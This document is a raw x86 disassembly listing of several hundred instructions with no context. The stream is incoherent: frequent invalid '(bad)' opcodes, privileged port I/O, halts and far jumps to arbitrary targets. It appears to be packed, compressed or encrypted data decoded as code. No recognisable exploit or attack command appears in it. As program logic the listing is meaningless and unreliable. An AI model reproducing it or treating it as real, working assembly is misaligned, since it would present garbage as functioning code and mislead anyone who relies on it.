  41fd56:	pop    ebp
  41fd57:	sahf   
  41fd58:	xchg   ecx,eax
  41fd59:	fs pusha 
  41fd5b:	push   edx
  41fd5c:	dec    BYTE PTR [ebx+0x79]
  41fd5f:	mov    bl,0xe2
  41fd61:	pop    edx
  41fd62:	icebp  
  41fd63:	int    0x6f
  41fd65:	rcr    dl,1
  41fd67:	push   edx
  41fd68:	out    0x88,eax
  41fd6a:	bound  esi,QWORD PTR [eax]
  41fd6c:	in     eax,dx
  41fd6d:	mov    WORD PTR [edx+ebp*1-0x2b9a777f],di
  41fd75:	ins    BYTE PTR es:[edi],dx
  41fd76:	mov    esp,0x54012e97
  41fd7b:	mov    WORD PTR [esi-0x23],cs
  41fd7e:	outs   dx,BYTE PTR ds:[esi]
  41fd7f:	push   ebp
  41fd80:	daa    
  41fd81:	inc    eax
  41fd82:	or     al,0x70
  41fd84:	stos   BYTE PTR es:[edi],al
  41fd85:	add    al,BYTE PTR ds:0x7d0dacd8
  41fd8b:	pop    edx
  41fd8c:	jne    0x41fd9e
  41fd8e:	push   ecx
  41fd8f:	(bad)  
  41fd90:	stos   BYTE PTR es:[edi],al
  41fd91:	aad    0x68
  41fd93:	bound  edi,QWORD PTR ds:0xe6d3db94
  41fd99:	pop    es
  41fd9a:	lods   eax,DWORD PTR ds:[esi]
  41fd9b:	xchg   edi,eax
  41fd9c:	inc    edi
  41fd9d:	or     esi,DWORD PTR [ebp+ebp*2+0xe32b71b]
  41fda4:	mov    edi,0xbcd9d51
  41fda9:	xor    al,0x7
  41fdab:	mov    DWORD PTR [edx-0x7d],eax
  41fdae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdaf:	scas   eax,DWORD PTR es:[edi]
  41fdb0:	nop
  41fdb1:	mov    edx,DWORD PTR [ebx+esi*4+0x4e]
  41fdb5:	sbb    ch,bl
  41fdb7:	les    esp,FWORD PTR [edx+0x12]
  41fdba:	push   0xb81e9c07
  41fdbf:	sub    ah,BYTE PTR [ebp+ebx*8+0x46]
  41fdc3:	es push ss
  41fdc5:	mov    al,0xb4
  41fdc7:	push   esi
  41fdc8:	jbe    0x41fe34
  41fdca:	jb     0x41fdf3
  41fdcc:	and    esi,DWORD PTR [ebx]
  41fdce:	into   
  41fdcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdd0:	adc    DWORD PTR [esi],ebp
  41fdd2:	aas    
  41fdd3:	push   0x79
  41fdd5:	mov    ah,0x6c
  41fdd7:	test   DWORD PTR [ebx+edi*2+0x358d6557],ecx
  41fdde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fddf:	xchg   edi,eax
  41fde0:	lahf   
  41fde1:	push   ebp
  41fde2:	mov    eax,0x52d4e806
  41fde7:	aam    0xbf
  41fde9:	dec    ebp
  41fdea:	inc    esi
  41fdeb:	pop    esi
  41fdec:	pop    esp
  41fded:	clc    
  41fdee:	or     dl,BYTE PTR [ebx]
  41fdf0:	outs   dx,BYTE PTR ds:[esi]
  41fdf1:	dec    esi
  41fdf2:	aas    
  41fdf3:	repz add eax,0x5d426622
  41fdf9:	and    eax,0x8b73d603
  41fdfe:	sub    BYTE PTR [edx+0x180485e2],0x90
  41fe05:	mov    dh,0xb8
  41fe07:	int    0x2e
  41fe09:	dec    eax
  41fe0a:	and    ah,BYTE PTR [edi]
  41fe0c:	pop    ebp
  41fe0d:	es je  0x41fdcb
  41fe10:	lahf   
  41fe11:	xchg   al,ch
  41fe13:	push   0x899e86cd
  41fe18:	jbe    0x41fdac
  41fe1a:	push   ebx
  41fe1b:	cmp    al,0xf3
  41fe1d:	mov    ch,0xe7
  41fe1f:	mov    ah,0xc8
  41fe21:	je     0x41fe6b
  41fe23:	outs   dx,BYTE PTR ds:[esi]
  41fe24:	js     0x41fe09
  41fe26:	mov    al,ds:0x20a77257
  41fe2b:	retf   
  41fe2c:	lods   eax,DWORD PTR ds:[esi]
  41fe2d:	mov    eax,0xc1ff2320
  41fe32:	mul    BYTE PTR [ebp-0xefb9722]
  41fe38:	adc    ebx,esp
  41fe3a:	sbb    ebp,DWORD PTR [ebp+eiz*2-0x41]
  41fe3e:	xor    bh,BYTE PTR [ecx+0x6330502d]
  41fe44:	dec    eax
  41fe45:	mov    es,WORD PTR es:[eax-0x739c73e2]
  41fe4c:	push   ecx
  41fe4d:	and    edi,DWORD PTR [esi-0x51014861]
  41fe53:	call   0x3f1e:0x8b9ff3c4
  41fe5a:	xor    BYTE PTR [edi-0x8],ah
  41fe5d:	not    al
  41fe5f:	pop    esp
  41fe60:	int3   
  41fe61:	jmp    0xa1c2:0xd95bf211
  41fe68:	or     esp,esi
  41fe6a:	mov    ecx,0xf9f4132
  41fe6f:	adc    dh,BYTE PTR [edi+0x42757056]
  41fe75:	cmc    
  41fe76:	sbb    esp,DWORD PTR [edx-0x15]
  41fe79:	cmp    BYTE PTR [edi],0xe1
  41fe7c:	iret   
  41fe7d:	enter  0xc60f,0xdf
  41fe81:	mov    edi,0x932a6834
  41fe86:	jmp    0x74fb:0xc4710aab
  41fe8d:	arpl   bp,sp
  41fe8f:	pop    ebp
  41fe90:	inc    edi
  41fe91:	daa    
  41fe92:	nop
  41fe93:	jg     0x41fe1f
  41fe95:	dec    ebp
  41fe96:	sbb    DWORD PTR [edi+0xa],esi
  41fe99:	push   0x9c8ac63c
  41fe9e:	xchg   ebx,eax
  41fe9f:	mov    eax,0x63c5ce27
  41fea4:	cli    
  41fea5:	outs   dx,DWORD PTR ds:[esi]
  41fea6:	mov    WORD PTR [edi+edx*4+0x2179ba7c],?
  41fead:	stos   BYTE PTR es:[edi],al
  41feae:	jle    0x41fe5c
  41feb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41feb1:	je     0x41feed
  41feb3:	mov    bl,0xe1
  41feb5:	xchg   esp,eax
  41feb6:	test   eax,0x763a95ca
  41febb:	arpl   WORD PTR [edi+0x52],ax
  41febe:	(bad)  
  41febf:	lods   al,BYTE PTR ds:[esi]
  41fec0:	sbb    al,0x62
  41fec2:	or     al,0x75
  41fec4:	xchg   esi,eax
  41fec5:	popf   
  41fec6:	mov    bl,0x7c
  41fec8:	jge    0x41fe6b
  41feca:	dec    edx
  41fecb:	xchg   esi,eax
  41fecc:	sub    DWORD PTR [eax],0xffffff88
  41fecf:	out    dx,al
  41fed0:	or     al,0x23
  41fed2:	xchg   edi,eax
  41fed3:	jmp    DWORD PTR [eax-0x4d]
  41fed6:	lahf   
  41fed7:	into   
  41fed8:	jg     0x41ff27
  41feda:	push   0x1e
  41fedc:	stc    
  41fedd:	jns    0x41fef8
  41fedf:	rcl    DWORD PTR [edi+0x47],0x62
  41fee3:	popf   
  41fee4:	test   edx,edi
  41fee6:	mov    ds,WORD PTR [esi]
  41fee8:	mov    esi,0x7920d3ac
  41feed:	jp     0x41ff1e
  41feef:	mov    dh,0x64
  41fef1:	ins    DWORD PTR es:[edi],dx
  41fef2:	std    
  41fef3:	data16 xor BYTE PTR [eax-0x3515e5c8],bl
  41fefa:	and    eax,esi
  41fefc:	rcl    DWORD PTR [ebx+0x41],cl
  41feff:	and    dh,BYTE PTR [ecx]
  41ff01:	aad    0x89
  41ff03:	aaa    
  41ff04:	pop    ebp
  41ff05:	out    0x6d,al
  41ff07:	call   0x5bd43e4b
  41ff0c:	test   BYTE PTR [ebp+0x29b0616e],dl
  41ff12:	pusha  
  41ff13:	hlt    
  41ff14:	mov    esi,esp
  41ff16:	pop    ebx
  41ff17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff18:	or     al,0xf7
  41ff1a:	ret    
  41ff1b:	cmp    dh,BYTE PTR [edx+0x7c04ebb7]
  41ff21:	mov    WORD PTR ds:0xbb282c8e,cs
  41ff27:	dec    ebp
  41ff28:	jmp    0x41ff3d
  41ff2a:	xlat   BYTE PTR ds:[ebx]
  41ff2b:	das    
  41ff2c:	add    ch,BYTE PTR [ecx+edx*8+0x7904190c]
  41ff33:	jo     0x41feeb
  41ff35:	int3   
  41ff36:	mov    al,ds:0x252139cb
  41ff3b:	daa    
  41ff3c:	inc    edi
  41ff3d:	cli    
  41ff3e:	out    0xb5,eax
  41ff40:	jmp    0x581e:0x41e624e9
  41ff47:	pop    es
  41ff48:	xchg   edx,eax
  41ff49:	add    edi,0xffffffa3
  41ff4c:	add    al,0x29
  41ff4e:	retf   0x16fd
  41ff51:	sahf   
  41ff52:	pop    esp
  41ff53:	cld    
  41ff54:	jbe    0x41ff73
  41ff56:	dec    edi
  41ff57:	test   edx,edi
  41ff59:	in     al,0x90
  41ff5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff5c:	bound  esi,QWORD PTR [esi-0x31]
  41ff5f:	cmp    DWORD PTR [ebx-0x64dff2b5],0xffffffb3
  41ff66:	push   ecx
  41ff67:	fistp  QWORD PTR [edi-0x1634835b]
  41ff6d:	popf   
  41ff6e:	imul   DWORD PTR [edx]
  41ff70:	cmp    eax,0xb231714e
  41ff75:	pop    ebp
  41ff76:	cmp    eax,edx
  41ff78:	jmp    FWORD PTR [esi+0xf]
  41ff7b:	push   esi
  41ff7c:	rol    ebx,cl
  41ff7e:	push   esi
  41ff7f:	adc    ebx,esp
  41ff81:	push   edi
  41ff82:	pop    edi
  41ff83:	xchg   bl,dh
  41ff85:	sub    eax,0xeb7e54b2
  41ff8a:	ss fwait
  41ff8c:	mov    ebp,0x6c845ac
  41ff91:	xchg   BYTE PTR [eax+eax*8],ah
  41ff94:	(bad)  
  41ff95:	int    0x22
  41ff97:	mov    DWORD PTR [di+0x1a],edx
  41ff9b:	cmp    BYTE PTR [eax+ecx*1+0x53064b67],dh
  41ffa2:	jl     0x41ffa7
  41ffa4:	neg    DWORD PTR [ecx+0x3f]
  41ffa7:	cli    
  41ffa8:	mov    bh,0x6
  41ffaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffab:	pushf  
  41ffac:	jbe    0x41ffbe
  41ffae:	jae    0x41ffeb
  41ffb0:	push   ds
  41ffb1:	mov    esi,0xda3e31a7
  41ffb6:	clc    
  41ffb7:	inc    dx
  41ffb9:	cmp    ebx,ecx
  41ffbb:	mov    esp,0x1a3c0834
  41ffc0:	inc    ecx
  41ffc1:	test   DWORD PTR [eax+edx*4-0x44a31805],0xe0d49fc3
  41ffcc:	sbb    ecx,DWORD PTR [edi+eax*1]
  41ffcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffd0:	pop    DWORD PTR [ebx]
  41ffd2:	inc    esi
  41ffd3:	jmp    0x41ff72
  41ffd5:	ja     0x41ffb8
  41ffd7:	push   ebx
  41ffd8:	sbb    eax,0xb92f41c9
  41ffdd:	mov    ds:0x3c64bec2,eax
  41ffe2:	sub    DWORD PTR [eax+0x306b993b],ecx
  41ffe8:	push   eax
  41ffe9:	sub    al,0x10
  41ffeb:	adc    ax,WORD PTR [edx-0x10]
  41ffef:	sbb    al,0xee
  41fff1:	dec    esi
  41fff2:	js     0x420065
  41fff4:	ss add esi,ebx
  41fff7:	sub    edi,DWORD PTR [ecx-0x3c2f2c24]
  41fffd:	pop    ss
  41fffe:	(bad)  
  41ffff:	sahf   
  420000:	bound  esi,QWORD PTR [ebx+0x7716856b]
  420006:	dec    edx
  420007:	ins    BYTE PTR es:[edi],dx
  420008:	jns    0x420041
  42000a:	or     ch,BYTE PTR [edx-0x59]
  42000d:	fcmovne st,st(2)
  42000f:	jnp    0x41ffe0
  420011:	hlt    
  420012:	mov    BYTE PTR [esi-0x144fa57a],dh
  420018:	mov    bl,0x60
  42001a:	arpl   WORD PTR [ecx+ebp*4],sp
  42001d:	push   0xffffffcf
  42001f:	push   0xf188d4d0
  420024:	inc    ebx
  420025:	push   ecx
  420026:	dec    eax
  420027:	inc    eax
  420028:	or     al,0x5d
  42002a:	push   ebp
  42002b:	inc    ebx
  42002c:	stos   DWORD PTR es:[edi],eax
  42002d:	push   eax
  42002e:	sub    bh,dl
  420030:	push   eax
  420031:	mov    al,ds:0x80caa5da
  420036:	pop    es
  420037:	mov    al,al
  420039:	cmp    DWORD PTR [esi-0x31c88a21],eax
  42003f:	test   eax,0xd2d9eefc
  420044:	std    
  420045:	out    0x84,eax
  420047:	bound  edx,QWORD PTR [ecx+0x1f308b17]
  42004d:	(bad)  
  42004e:	ins    BYTE PTR es:[edi],dx
  42004f:	mov    BYTE PTR [edi],dh
  420051:	fild   WORD PTR [edi-0x6d]
  420054:	ds aaa 
  420056:	push   esi
  420057:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420058:	xor    dl,BYTE PTR [eax]
  42005a:	pop    esi
  42005b:	adc    BYTE PTR [ebp-0x1337ed6f],cl
  420061:	mov    WORD PTR [esi],ds
  420063:	mov    ebx,edx
  420065:	sbb    al,0x8f
  420067:	xchg   edi,eax
  420068:	in     al,dx
  420069:	sub    eax,0x9492361c
  42006e:	push   0xa635c332
  420073:	cmp    ch,BYTE PTR [ebp-0x67]
  420076:	(bad)  
  420078:	repz xor al,0xfa
  42007b:	jno    0x4200e3
  42007d:	inc    edi
  42007e:	sahf   
  42007f:	adc    dh,BYTE PTR [esi+esi*8-0x121eee61]
  420086:	or     ah,BYTE PTR [edx+0x404b5d13]
  42008c:	or     DWORD PTR [ebx-0x44e6dd1e],edx
  420092:	dec    edi
  420093:	in     al,0x8d
  420095:	add    cl,BYTE PTR [eax+0x52cde62f]
  42009b:	cmp    ebx,ebx
  42009d:	ds mov bl,0xe6
  4200a0:	ins    BYTE PTR es:[edi],dx
  4200a1:	or     al,BYTE PTR [ebp+0x46]
  4200a4:	(bad)  
  4200a5:	cs jge 0x420037
  4200a8:	pop    edi
  4200a9:	or     ebx,DWORD PTR [edx+0x4855e7a1]
  4200af:	adc    eax,0xba33055b
  4200b4:	mov    dl,0xa9
  4200b6:	jle    0x420044
  4200b8:	cwde   
  4200b9:	jl     0x420050
  4200bb:	xor    ebx,0xffffffbf
  4200be:	mov    ds:0xeee28df8,eax
  4200c3:	dec    ebp
  4200c4:	push   ds
  4200c5:	ror    BYTE PTR [edx-0x32e9c7f9],0x61
  4200cc:	inc    ecx
  4200cd:	popa   
  4200ce:	mov    edi,0x5e81b6cf
  4200d3:	fisubr WORD PTR [eax]
  4200d5:	cld    
  4200d6:	in     al,0xe7
  4200d8:	in     al,0xb9
  4200da:	cmc    
  4200db:	fistp  QWORD PTR [ebp-0x1295112f]
  4200e1:	lds    eax,FWORD PTR [esi+0x4e]
  4200e4:	jbe    0x420152
  4200e6:	jmp    0xc117:0x153fe26c
  4200ed:	mov    esi,0x88b54f1
  4200f2:	neg    DWORD PTR [ebx+edx*8]
  4200f5:	loopne 0x4200b4
  4200f7:	ds xor al,0x7
  4200fa:	xor    eax,0x10375276
  4200ff:	loopne 0x420115
  420101:	mov    edi,0xbc46a86c
  420106:	arpl   bx,cx
  420108:	jae    0x420110
  42010a:	fwait
  42010b:	cmp    BYTE PTR [eax+0x57],bl
  42010e:	sbb    eax,0xd86c869f
  420113:	jae    0x420155
  420115:	out    0xb4,eax
  420117:	or     eax,0x965a802b
  42011c:	inc    ebp
  42011d:	inc    edi
  42011e:	pop    ebp
  42011f:	xor    eax,0x4a86ed1d
  420124:	xor    al,0x8d
  420126:	jmp    0x156ada13
  42012b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42012c:	jno    0x420179
  42012e:	dec    BYTE PTR [edi]
  420130:	push   es
  420131:	hlt    
  420132:	jmp    0x8096dc38
  420137:	add    dh,BYTE PTR [eax]
  420139:	mov    esp,0x4dd45ac9
  42013e:	adc    esp,DWORD PTR [edx+ecx*1-0x39]
  420142:	xchg   BYTE PTR [edx],dh
  420144:	or     al,0x91
  420146:	cmp    ch,ch
  420148:	jl     0x420166
  42014a:	push   0xffffffc6
  42014c:	inc    edi
  42014d:	nop
  42014e:	mov    dl,0x1d
  420150:	imul   esp,DWORD PTR [eax+esi*2],0xd
  420154:	test   DWORD PTR [ebx],ebp
  420156:	jge    0x42017e
  420158:	shl    DWORD PTR [ecx],1
  42015a:	shr    BYTE PTR [edi],cl
  42015c:	out    0xd8,al
  42015e:	fistp  WORD PTR [ebx+0x4d]
  420161:	pop    ecx
  420162:	pop    ss
  420163:	jne    0x42010f
  420165:	cmc    
  420166:	iret   
  420167:	rol    DWORD PTR [edi+ebx*4+0x33],cl
  42016b:	sub    eax,0x869f4846
  420170:	les    ebp,FWORD PTR [ebx+0x5acc68e2]
  420176:	push   ebx
  420177:	js     0x4201ed
  420179:	xor    eax,0x42b07e2d
  42017e:	mov    dl,0x7c
  420180:	xchg   edi,eax
  420181:	adc    BYTE PTR [ecx-0x5b],ah
  420184:	and    eax,0xdc6f5d68
  420189:	mov    ds:0xc4586bd7,eax
  42018e:	ins    BYTE PTR es:[edi],dx
  42018f:	jl     0x420126
  420191:	jp     0x4201f8
  420193:	shl    BYTE PTR [ecx-0x6f593286],0x64
  42019a:	(bad)  
  42019b:	hlt    
  42019c:	shl    DWORD PTR [ecx-0x2a],1
  42019f:	sub    eax,0xfcd0b5cd
  4201a4:	(bad)
  4201a7:	and    al,0x67
  4201a9:	or     al,0x73
  4201ab:	mov    ah,0xa4
  4201ad:	rcr    DWORD PTR [edi],1
  4201af:	outs   dx,BYTE PTR ds:[esi]
  4201b0:	mov    esp,DWORD PTR [esi-0x108a35b6]
  4201b6:	add    ebx,ebx
  4201b8:	xchg   edx,eax
  4201ba:	dec    edi
  4201bb:	ret    
  4201bc:	call   0x346bc3d5
  4201c1:	fisub  DWORD PTR [esi-0x691047bb]
  4201c7:	fwait
  4201c8:	lods   al,BYTE PTR ds:[esi]
  4201c9:	ds jmp 0x9763:0xc76b6be1
  4201d1:	daa    
  4201d2:	mov    BYTE PTR [eax-0x58],bl
  4201d5:	sub    ebx,DWORD PTR [esi-0x31]
  4201d8:	push   esp
  4201d9:	lods   eax,DWORD PTR ds:[esi]
  4201da:	sub    esi,DWORD PTR [ecx+esi*8-0x54]
  4201de:	dec    edx
  4201df:	or     eax,0xf710e60f
  4201e4:	inc    ebx
  4201e5:	test   al,0xc6
  4201e8:	loopne 0x42023f
  4201ea:	sahf   
  4201eb:	cmp    al,0x6f
  4201ed:	mov    dh,0xb2
  4201ef:	jae    0x4201c5
  4201f1:	pop    ecx
  4201f2:	dec    esp
  4201f3:	mov    es,ebp
  4201f5:	mov    BYTE PTR [edx+0x36a96433],0x55
  4201fc:	fs cld 
  4201fe:	inc    ecx
  4201ff:	xchg   edx,eax
  420200:	aad    0x8a
  420202:	je     0x42025b
  420204:	and    esi,DWORD PTR [ecx+0x2a9d5f9f]
  42020a:	jo     0x420231
  42020c:	(bad)  
  42020d:	sbb    eax,0x961b6e98
  420212:	cmp    DWORD PTR [ebx-0x36c1db64],ebx
  420218:	gs push ss
  42021a:	mov    cl,0x2b
  42021c:	pop    ss
  42021d:	adc    al,BYTE PTR ds:0x47ccd7ac
  420223:	shl    BYTE PTR [ecx-0x6de97ed4],0x66
  42022a:	mov    ebx,DWORD PTR [esi+eiz*1-0x55]
  42022e:	fimul  DWORD PTR [ecx]
  420230:	or     BYTE PTR [edi],ah
  420232:	sub    eax,edi
  420234:	pop    esi
  420235:	or     al,0xb5
  420237:	lahf   
  420238:	imul   edi,DWORD PTR [ebx+0x7db27c87],0x20009f70
  420242:	scas   al,BYTE PTR es:[di]
  420244:	jl     0x420229
  420246:	jb     0x4201fb
  420248:	shr    BYTE PTR [esi],1
  42024a:	sub    BYTE PTR [esi+0x50],dh
  42024d:	jp     0x42021e
  42024f:	arpl   bx,si
  420251:	test   al,0x22
  420253:	jecxz  0x420214
  420255:	std    
  420256:	cld    
  420257:	mov    ecx,0xd072dc5e
  42025c:	out    0x61,eax
  42025e:	sbb    edi,0xfcab9f11
  420264:	jl     0x420210
  420266:	push   esi
  420267:	cwde   
  420268:	cmp    DWORD PTR [ebp+0x2e6d5d64],esi
  42026e:	push   0x78
  420270:	cmp    ecx,edi
  420272:	mov    ebx,0x85454f3e
  420277:	fldenv [eax]
  420279:	or     BYTE PTR [edi-0xb],dh
  42027c:	xor    cl,BYTE PTR [esi+0x525c9d0f]
  420282:	sub    al,0x28
  420284:	mov    edx,0x873685da
  420289:	add    DWORD PTR [edx],eax
  42028b:	inc    esi
  42028c:	ret    0x7699
  42028f:	lahf   
  420290:	inc    ebx
  420291:	and    esi,ebp
  420293:	int    0xa2
  420295:	xlat   BYTE PTR ds:[ebx]
  420296:	adc    eax,0x15db83d2
  42029b:	mov    ds:0xd5372a6,al
  4202a0:	and    BYTE PTR [edx+edx*4+0x56681bea],0x92
  4202a8:	dec    ecx
  4202a9:	enter  0x1d97,0x56
  4202ad:	mov    dh,0xcb
  4202af:	xor    esi,DWORD PTR [esi-0x50]
  4202b2:	test   BYTE PTR [esi+0x3be9f64f],bl
  4202b8:	jmp    0x2df7:0x1f2758bc
  4202bf:	xchg   ch,dh
  4202c1:	jnp    0x420296
  4202c3:	loope  0x420344
  4202c5:	lock adc BYTE PTR [ecx+0x6533c38c],cl
  4202cc:	bound  ebx,QWORD PTR [edx-0x76b8e3a6]
  4202d2:	ins    BYTE PTR es:[edi],dx
  4202d3:	rcl    DWORD PTR [ecx],cl
  4202d5:	pushf  
  4202d6:	dec    esi
  4202d7:	push   0x2eec7f6d
  4202dc:	push   edi
  4202dd:	or     eax,0x609e4cfa
  4202e2:	js     0x4202e5
  4202e4:	push   edx
  4202e5:	daa    
  4202e6:	mov    ds:0x9eba6482,al
  4202eb:	or     al,bh
  4202ed:	or     BYTE PTR [ecx],bl
  4202ef:	rcr    BYTE PTR [ebp+0x56],cl
  4202f2:	sub    DWORD PTR [ecx+0x71],ebp
  4202f5:	dec    ebp
  4202f6:	cmc    
  4202f7:	xchg   edi,eax
  4202f8:	push   0xd03c8092
  4202fd:	xor    BYTE PTR [ecx],dl
  4202ff:	inc    ecx
  420300:	mov    ebp,0xb11e6530
  420305:	in     al,dx
  420306:	out    dx,al
  420307:	stc    
  420308:	pop    ecx
  420309:	pop    ds
  42030a:	cmp    ecx,DWORD PTR [esi+0x40]
  42030d:	adc    DWORD PTR [ebp-0x7c3b92d8],edx
  420313:	fadd   QWORD PTR [ebp+eax*8-0x2b]
  420317:	mov    edi,0x70c77217
  42031c:	add    DWORD PTR [edx-0x8],esp
  42031f:	xchg   esp,eax
  420320:	pushf  
  420321:	stos   BYTE PTR es:[edi],al
  420322:	xor    al,0x3
  420324:	add    ebp,ebp
  420326:	mul    DWORD PTR [esi-0x75]
  420329:	jo     0x420393
  42032b:	push   esi
  42032c:	xor    BYTE PTR [esi],cl
  42032e:	hlt    
  42032f:	pop    edi
  420330:	xor    esi,DWORD PTR [ebp-0x47bc414f]
  420336:	out    0xc,al
  420338:	push   DWORD PTR [ecx*4+0x192b27d5]
  42033f:	ins    BYTE PTR es:[edi],dx
  420340:	iret   
  420341:	push   cs
  420342:	retf   0x9c20
  420345:	je     0x42034a
  420347:	xchg   esp,eax
  420348:	mov    esi,0x844ceddb
  42034d:	mov    ch,0xb1
  42034f:	jb     0x42030c
  420351:	pop    esp
  420352:	sub    BYTE PTR [edi+0x4c],ah
  420355:	frndint 
  420357:	mov    ch,BYTE PTR [ebp-0x6cbda4ab]
  42035d:	push   ecx
  42035e:	pop    esp
  42035f:	cmp    cl,BYTE PTR [edx-0x53]
  420362:	cwde   
  420363:	fidivr DWORD PTR [ecx+0x5b]
  420366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420367:	dec    edi
  420368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420369:	pop    es
  42036a:	in     al,dx
  42036b:	pop    ecx
  42036c:	mov    ds:0xc8fc0bd,al
  420371:	(bad)
  420374:	or     al,0xd3
  420376:	xchg   esp,eax
  420377:	push   ss
  420378:	int3   
  420379:	or     edi,DWORD PTR [eax+0x6b]
  42037c:	js     0x420309
  42037e:	daa    
  42037f:	lock adc ax,0x8acc
  420384:	add    eax,0x5b3b2d92
  420389:	(bad)  
  42038a:	or     esp,ebx
  42038c:	pop    ebx
  42038d:	add    DWORD PTR [eax-0x6a],ebp
  420390:	mov    edi,?
  420392:	jl     0x4203b3
  420394:	push   edi
  420395:	cmp    ch,dl
  420397:	lahf   
  420398:	xor    al,0x97
  42039a:	push   es
  42039b:	repz sbb al,0x57
  42039e:	push   cs
  42039f:	cmp    eax,0x7089ba04
  4203a4:	mov    bh,bh
  4203a6:	push   edi
  4203a7:	lods   eax,DWORD PTR ds:[esi]
  4203a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203a9:	and    BYTE PTR [ecx],dh
  4203ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203ac:	jmp    0x2a3d:0x66de48be
  4203b3:	(bad)
  4203b7:	test   DWORD PTR [ecx],0xf598b479
  4203bd:	mov    esi,0xa4d61ee8
  4203c2:	mov    ch,0x88
  4203c4:	jns    0x4203bc
  4203c6:	es ins BYTE PTR es:[edi],dx
  4203c8:	mov    ebp,0xb5d6b126
  4203cd:	rcr    DWORD PTR [eax],1
  4203cf:	and    al,0x87
  4203d1:	pop    ecx
  4203d2:	adc    BYTE PTR [ecx-0x50],dh
  4203d5:	jbe    0x4203b1
  4203d7:	mov    eax,ds:0x6e70f83
  4203dc:	loope  0x420419
  4203de:	loope  0x420407
  4203e0:	lods   eax,DWORD PTR es:[esi]
  4203e2:	jl     0x42045a
  4203e4:	mov    ah,0xe9
  4203e6:	xor    BYTE PTR [ecx+edx*4+0x3225c71],ah
  4203ed:	and    al,0xbc
  4203ef:	loope  0x4203ea
  4203f1:	mov    esp,?
  4203f3:	and    DWORD PTR [ecx],esi
  4203f5:	out    0x8c,eax
  4203f7:	ror    BYTE PTR [ebp+0x7b016c05],cl
  4203fd:	ins    DWORD PTR es:[edi],dx
  4203fe:	and    edi,DWORD PTR [eax*8+0x5f9c3ad5]
  420405:	lods   eax,DWORD PTR ds:[esi]
  420406:	jp     0x42039f
  420408:	imul   edx,DWORD PTR [esi],0xe9cbe185
  42040e:	in     al,0xda
  420410:	xor    eax,DWORD PTR [eax]
  420412:	fst    DWORD PTR [eax-0x20744e66]
  420418:	fidiv  WORD PTR [ecx]
  42041a:	jg     0x420426
  42041c:	or     eax,0x40660940
  420421:	fdiv   st,st(5)
  420423:	and    BYTE PTR es:[ebp+0x79264cd7],dh
  42042a:	aaa    
  42042b:	xor    dh,bl
  42042d:	push   ebp
  42042e:	pop    ecx
  42042f:	jle    0x4203c4
  420431:	mov    ebp,DWORD PTR [edx+0x63da4108]
  420437:	push   ss
  420438:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420439:	sar    edx,cl
  42043b:	inc    ebp
  42043c:	popa   
  42043d:	test   al,dl
  42043f:	add    DWORD PTR [esi-0x20],ebx
  420442:	mov    bh,bh
  420444:	pop    eax
  420445:	sub    esi,ebp
  420447:	sub    al,0x98
  420449:	and    dh,BYTE PTR [edx-0x48]
  42044c:	cli    
  42044d:	clc    
  42044e:	adc    eax,0xaabb09a9
  420453:	lds    edx,FWORD PTR [ebx-0x2792243f]
  420459:	test   BYTE PTR [ebx+0x7f],dh
  42045c:	adc    eax,0x19bb9621
  420461:	pop    es
  420462:	test   DWORD PTR [ecx],ebx
  420464:	aas    
  420465:	lea    esi,[eax]
  420467:	shl    DWORD PTR [ebx-0x5014dbe7],0x53
  42046e:	xchg   ebp,eax
  42046f:	dec    edx
  420470:	pushf  
  420471:	outs   dx,BYTE PTR ds:[esi]
  420472:	push   edx
  420473:	dec    esp
  420474:	or     al,dl
  420476:	mov    BYTE PTR [edi+0x5],cl
  420479:	cmp    dl,0x4c
  42047c:	xchg   ebp,eax
  42047d:	pop    esp
  42047e:	dec    eax
  42047f:	mov    ch,0x86
  420481:	test   BYTE PTR [edi+0x18a693ae],dh
  420487:	dec    ecx
  420488:	adc    ah,BYTE PTR [edx+0x7]
  42048b:	mov    dh,0xf4
  42048d:	pop    eax
  42048e:	adc    eax,DWORD PTR [eax+0x1f]
  420491:	nop
  420492:	shl    BYTE PTR [eax],0xd5
  420495:	add    cl,cl
  420497:	repz scas eax,DWORD PTR es:[edi]
  420499:	add    eax,esi
  42049b:	mov    esi,0xb5fd1b68
  4204a0:	pop    ebp
  4204a1:	lea    esp,[edi]
  4204a3:	sub    ecx,ebp
  4204a5:	or     eax,0x189ad679
  4204aa:	leave  
  4204ab:	mov    DWORD PTR [eax+0x70],esp
  4204ae:	inc    ecx
  4204af:	and    ecx,edi
  4204b1:	cmp    BYTE PTR [edx],ch
  4204b3:	sahf   
  4204b4:	mov    ch,0xaf
  4204b6:	sbb    ecx,esp
  4204b8:	push   ss
  4204b9:	mov    ah,0x24
  4204bb:	rcr    ch,cl
  4204bd:	mov    edi,0x67a7da3f
  4204c2:	js     0x42044f
  4204c4:	and    eax,0x772c31
  4204c9:	mov    BYTE PTR [ebx-0x1c],ah
  4204cc:	(bad)  
  4204cd:	js     0x42053d
  4204cf:	in     al,0x8d
  4204d1:	cdq    
  4204d2:	out    dx,eax
  4204d3:	xchg   DWORD PTR [ebx+edx*4+0x130b565c],esp
  4204da:	xchg   ebp,eax
  4204db:	test   eax,0x5f6063be
  4204e0:	fld    QWORD PTR [edi]
  4204e2:	xlat   BYTE PTR ds:[ebx]
  4204e3:	add    edi,DWORD PTR [ebx-0x2cb99112]
  4204e9:	aaa    
  4204ea:	mov    bh,0xdf
  4204ec:	push   edi
  4204ed:	imul   esi,eax,0xf1ef6449
  4204f3:	adc    esi,ebp
  4204f5:	push   ds
  4204f6:	xlat   BYTE PTR ds:[ebx]
  4204f7:	push   esp
  4204f8:	mov    DWORD PTR [edi+0x663ece09],ecx
